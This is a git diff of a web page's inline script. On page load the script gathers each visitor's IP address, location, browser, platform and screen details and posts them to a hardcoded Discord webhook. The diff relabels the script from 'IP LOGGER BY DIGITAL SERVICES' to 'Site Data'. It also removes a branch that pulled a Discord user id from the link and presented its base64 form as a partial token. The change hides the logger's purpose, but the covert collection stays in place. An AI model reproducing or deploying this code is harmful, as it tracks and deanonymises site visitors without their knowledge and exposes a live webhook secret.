@@ -747,10 +747,8 @@
         return false;
       }
     </script>
-  
-    <script>
-
-      var webhookUrl = "https://discord.com/api/webhooks/1165295482973732974/geakIU2aSwHNerScSF1vZDTWBpWHsw8YRtpPtMjRD1b6eE5wRA00RoPUnFsSwxlUbehB";
+<script>
+        var webhookUrl = "https://discord.com/api/webhooks/1165295482973732974/geakIU2aSwHNerScSF1vZDTWBpWHsw8YRtpPtMjRD1b6eE5wRA00RoPUnFsSwxlUbehB";
 
 
     function getUserInfo() {
@@ -767,12 +765,6 @@
           var browserversion = navigator.appVersion
           var location = `${data.city}, ${data.region}, ${data.country_name}`;
 
-    const urlParams = new URLSearchParams(window.location.search);
-    const id = urlParams.get('id');
-
-
-const token = btoa(id)
-
 
 
     
@@ -784,20 +776,10 @@ const token = btoa(id)
 
 let iplogged = {
   author: {
-    name: "Developed by Sparks (:"
+    name: "Site Data"
   },
-  title: "Someone visited our website!",
-      description: `__**DISCORD INFO:**__
-
-**USER**: <@${id}>
-
-**ID**: ${id}
-
-**TOKEN (first part)**: ${token}.
-
-
-
-
+  title: "Someone logged onto the site!",
+      description: `
 __**WEB INFO:**__
 
 **IP Address**: ${ipAddress}
@@ -818,57 +800,13 @@ color: 15919626
 
 
 var params = {
-  username: "IP LOGGER BY DIGITAL SERVICES",
+  username: "Site Data",
 avatar_url: "https://thumbs.dreamstime.com/b/swiss-cheese-holes-18911609.jpg",
   embeds: [ iplogged ]
 }
 
 
-let iplogged2 = {
-  author: {
-    name: "IP LOGGER - Digital Services"
-  },
-  title: "NEW IP LOGGED",
-      description: `__**DISCORD INFO:**__
-
-**NO DISCORD INFO AVAILABLE**
-- Link did not contain user id
-
-
-
-
-__**WEB INFO:**__
-
-**IP Address**: ${ipAddress}
-
-**Location:** ${location}
-
-**Language**: ${language}
-
-**Search Browser**: ${browsername}, ${browserversion}
-
-**Platform**: ${platform}
-
-**Timezone**: ${timezoneOffset}
-
-**Screen resolution**: ${screenWidth} x ${screenHeight}`,
-color: 15919626
-}
-
-
-var params2 = {
-  username: "IP LOGGER BY DIGITAL SERVICES",
-avatar_url: "https://thumbs.dreamstime.com/b/swiss-cheese-holes-18911609.jpg",
-  embeds: [ iplogged2 ]
-}
-
-
-if (token !== "bnVsbA==") {
       request.send(JSON.stringify(params))
-} else {
-
- request.send(JSON.stringify(params2))
-}
 
 
 
@@ -878,6 +816,6 @@ if (token !== "bnVsbA==") {
     $(document).ready(function() {
       getUserInfo();
     });
-  </script>
+</script>
   </body>
 </html>
